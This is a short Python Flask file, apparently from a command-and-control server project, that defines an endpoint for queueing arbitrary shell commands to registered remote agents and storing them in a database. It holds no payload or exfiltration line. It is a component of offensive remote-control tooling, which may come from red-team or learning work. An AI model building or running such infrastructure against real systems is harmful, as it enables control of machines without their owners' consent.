"""
    This file stores all the functions that are used to interact with the tasks from the server
"""

from c2_config import *
from c2_database import *

@app.route("/tasks/create", methods=["POST"])
def create_task():
    """
    Parse Task sent by client, and stroe it to database
    """
    data = request.json
    if data == None:
        return jsonify({"status": "error: no data"})
    
    job_id       = os.urandom(16).hex() ##TODO: generate a random job id (might need to change this later)
    command_type = data["command_type"]
    cmd          = data["cmd"]
    agent_id     = data["agent_id"]

    ## error checking ##
    ##TODO: check if command type and cmd are valid

    if(not agent_exist(agent_id)):
        return jsonify({"status": "error: agent does not exist"})
    
    task = Task(
        command_type=command_type,
        cmd=cmd,
        job_status=CREATED,
        agent_id=agent_id,
        job_id=job_id
    )
    db.session.add(task)
    db.session.commit()
    print(f"[+] a new task has been created for agent {agent_id}")
    return jsonify({"status": "ok", "job_id": job_id})